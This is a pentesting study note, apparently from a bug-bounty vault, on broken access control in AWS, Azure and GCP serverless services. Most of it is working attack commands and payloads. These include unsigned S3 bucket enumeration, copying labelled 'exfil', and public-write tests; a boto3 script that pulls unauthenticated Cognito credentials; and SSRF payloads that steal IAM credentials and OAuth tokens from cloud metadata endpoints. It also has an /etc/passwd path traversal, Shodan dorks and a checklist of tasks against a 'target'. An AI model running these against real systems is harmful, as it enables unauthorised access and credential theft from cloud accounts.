---
tags: [bac, theory, cloud, serverless, aws, azure, gcp]
type: theory
severity: critical
owasp_ref: "A01:2021"
date: 2026-03-10
---

# ☁️ Cloud & Serverless Broken Access Control

## Why Cloud BAC Is Different
Cloud apps delegate access control to **IAM policies, API Gateway authorizers, and service-level configurations** — not just application code. This means BAC vulnerabilities live in infra config files, not just source code. Misconfigured cloud resources are often publicly exposed and easy to exploit when found.

---

## AWS API Gateway — Authorization Bypass

### Pattern 1: Lambda Authorizer Returns Wrong IAM Policy

```
AWS Lambda Authorizer flow:
  Client → API Gateway → Lambda Authorizer → {Allow/Deny}

Authorizer must return a valid IAM policy:
{
  "principalId": "user",
  "policyDocument": {
    "Statement": [{
      "Effect": "Allow",
      "Action": "execute-api:Invoke",
      "Resource": "arn:aws:execute-api:*:*:*/*/GET/users/me"  ← specific!
    }]
  }
}

VULNERABILITY: Wildcard resource in Allow policy:
  "Resource": "arn:aws:execute-api:*:*:*/*/*/*"   ← allows ALL methods/paths!
  "Resource": "*"                                   ← critical misconfiguration

EFFECT: User authenticated for /users/me can hit /admin/users
→ Authorizer returns Allow *, all endpoints accessible
```

### Pattern 2: API Gateway IAM Auth Misconfiguration

```bash
# Some API Gateway endpoints use IAM auth (sigv4-signed requests)
# but other endpoints on the same API have auth disabled

# Discover with unauthenticated requests:
curl https://API_ID.execute-api.REGION.amazonaws.com/prod/admin/users
# → 200? That endpoint has no auth!

# Or test with wrong/expired credentials:
curl -H "Authorization: AWS4-HMAC-SHA256 Credential=EXPIRED..." \
  https://API_ID.execute-api.REGION.amazonaws.com/prod/data
```

### Pattern 3: API Gateway Usage Plan / API Key Bypass

```bash
# API Keys in AWS are NOT security mechanisms — they're usage tracking
# But some apps use them as auth

# If you find an API key in JS/mobile app:
curl -H "x-api-key: LEAKED_KEY" \
  https://API_ID.execute-api.REGION.amazonaws.com/prod/admin

# Or try without key — some endpoints don't require it despite the plan
```

---

## AWS Lambda Function URLs

```bash
# Lambda Function URLs (2022+): direct HTTPS URLs for Lambda functions
# Format: https://FUNCTION_ID.lambda-url.REGION.on.aws/

# Default auth mode is AWS_IAM, but devs often set it to NONE for "convenience"
# NONE auth = completely public with zero authentication

# Discovery:
# 1. Check JS files, mobile apps for lambda-url domains
# 2. Google dork: site:*.lambda-url.us-east-1.on.aws
# 3. Shodan: hostname:lambda-url.us-east-1.on.aws

# Once found:
curl https://FUNCTION_ID.lambda-url.us-east-1.on.aws/
curl https://FUNCTION_ID.lambda-url.us-east-1.on.aws/admin
curl https://FUNCTION_ID.lambda-url.us-east-1.on.aws/users/1337
```

---

## S3 Bucket Access Control Misconfigurations

```bash
# 1. Discover S3 buckets from target
# Common naming: target-uploads, target-backups, target-assets, target-exports
aws s3 ls s3://target-uploads --no-sign-request       # public read?
aws s3 ls s3://target-backups --no-sign-request       # backups exposed?
aws s3 cp s3://target-exports/report.csv - --no-sign-request  # exfil!

# 2. List bucket contents (if public or overly permissive):
aws s3 ls s3://BUCKET_NAME/ --no-sign-request --recursive

# 3. Write to bucket (if write allowed):
echo "pwned" | aws s3 cp - s3://BUCKET_NAME/test.txt --no-sign-request
→ If it works: bucket has public write → can serve malicious files

# 4. Check bucket ACL and policy:
aws s3api get-bucket-acl --bucket BUCKET_NAME --no-sign-request
aws s3api get-bucket-policy --bucket BUCKET_NAME --no-sign-request

# 5. Tools for discovery:
# AWSBucketDump: finds buckets from domain name patterns
# S3Scanner: scans lists of bucket names
# trufflehog: finds leaked creds in S3 objects
```

---

## AWS Cognito Misconfigurations

```python
# Cognito is AWS's auth service — misconfigs lead to privilege escalation

# Pattern 1: Unauthenticated identity pool access
# Some Cognito identity pools allow unauthenticated (guest) access
# with an IAM role that has too many permissions

import boto3
cognito = boto3.client('cognito-identity', region_name='us-east-1')

# Get credentials without authenticating:
resp = cognito.get_id(
    AccountId='AWS_ACCOUNT_ID',
    IdentityPoolId='us-east-1:POOL_ID'
)
identity_id = resp['IdentityId']

creds = cognito.get_credentials_for_identity(IdentityId=identity_id)
# → creds['Credentials'] = {'AccessKeyId': ..., 'SecretKey': ..., 'SessionToken': ...}
# Now use these creds to enumerate what the unauthenticated role can access!

# Pattern 2: User Pool privilege escalation via custom attributes
# POST /signup with admin custom attribute:
# "custom:role": "admin"
# If the app reads custom:role from the JWT without server-side validation → privesc
```

---

## Azure API Management & Managed Identity

```bash
# Azure API Management (APIM) can have policies that bypass auth
# for certain routes

# Pattern: APIM policy allows specific paths without subscription key
# Test paths like /internal/*, /health, /metrics without auth headers

curl https://target.azure-api.net/api/internal/admin
curl https://target.azure-api.net/api/users -H "Ocp-Apim-Subscription-Key: LEAKED_KEY"

# Azure Managed Identity endpoint (SSRF → IMDS → cloud privesc)
# If you find SSRF: http://169.254.169.254/metadata/identity/oauth2/token
# Returns Azure AD access token for the VM/function's identity
```

---

## GCP Cloud Functions & Cloud Run

```bash
# GCP Cloud Functions with --allow-unauthenticated flag
# Discovery:
gcloud functions list  # if you have creds
# or: Google dork: site:cloudfunctions.net "target"

# Cloud Run services with public access:
curl https://SERVICE_NAME-HASH-REGION.a.run.app/admin
curl https://SERVICE_NAME-HASH-REGION.a.run.app/api/users

# GCP metadata server (via SSRF):
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
→ Returns OAuth access token for the service account
```

---

## Cloud Recon Techniques

```bash
# ── AWS Discovery ─────────────────────────────────────────────────────
# S3 bucket enumeration from domain name:
for word in dev staging prod backup uploads assets exports logs data; do
  aws s3 ls s3://target-$word --no-sign-request 2>/dev/null && echo "FOUND: target-$word"
done

# AWS account ID from public S3 bucket:
aws s3api get-bucket-policy --bucket TARGET_BUCKET --no-sign-request

# Lambda Function URL discovery (Google dork):
# site:lambda-url.*.amazonaws.com "target"

# ── Shodan Dorks for Cloud BAC ─────────────────────────────────────────
# Exposed API Gateways:
org:"Amazon" http.title:"Internal Server Error" "x-amzn-requestid"

# Exposed GCP Cloud Functions:
hostname:cloudfunctions.net "target"

# Exposed Azure Functions:
hostname:azurewebsites.net "target" http.status:200

# Kubernetes dashboard (cloud-deployed):
http.title:"Kubernetes Dashboard"

# Grafana (no auth):
http.title:"Grafana" http.status:200 "Sign In"

# Jenkins (accessible):
http.title:"Dashboard [Jenkins]"

# ── Cloud Security Tools ───────────────────────────────────────────────
# ScoutSuite — multi-cloud audit
pip install scoutsuite && scout aws --no-browser

# Prowler — AWS security tool
pip install prowler && prowler aws -c accessanalyzer_enabled

# CloudSploit — multi-cloud scanner
# Pacu — AWS exploitation framework
git clone https://github.com/RhinoSecurityLabs/pacu
```

---

## Serverless-Specific Attack Patterns

```python
# Pattern: Environment variable leakage via verbose errors
# Lambda functions store secrets in env vars
# If error handling shows env vars → creds leak

# Trigger a verbose error:
curl "https://lambda-url.region.on.aws/?debug=true&throw=1"
# Look for: DATABASE_URL, AWS_SECRET_ACCESS_KEY, API_KEY in response

# Pattern: Path traversal in serverless file handlers
# Lambda functions that process S3 paths:
POST /api/process
{"s3_key": "uploads/myfile.pdf"}
→ Try: {"s3_key": "../../../../etc/passwd"}
→ Try: {"s3_key": "config/secrets.json"}

# Pattern: SSRF via cloud function → IMDS → credential theft
# If function makes HTTP requests based on user input:
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ Returns IAM role name → hit /<role-name> → get temp AWS creds
```

---

## Tasks
- [ ] #task Enumerate S3 buckets from target domain naming patterns
- [ ] #task Check AWS Lambda Function URLs in JS files / mobile apps
- [ ] #task Test API Gateway endpoints without auth / with expired creds
- [ ] #task Run Shodan dorks for exposed cloud functions and dashboards
- [ ] #task Check Cognito identity pools for unauthenticated access
- [ ] #task Test SSRF toward cloud metadata endpoints (169.254.169.254)
- [ ] #task Discover GCP Cloud Functions/Cloud Run with public access
- [ ] #task Check Azure APIM for policy-based auth bypass on internal routes

---

## 🔗 Related Notes
- [[API-BAC]]
- [[Forced-Browsing]]
- [[Advanced-BAC-Chains]]
- [[Recon-Phase]]

---
*Tags: #cloud #serverless #aws #azure #gcp #bac #theory*
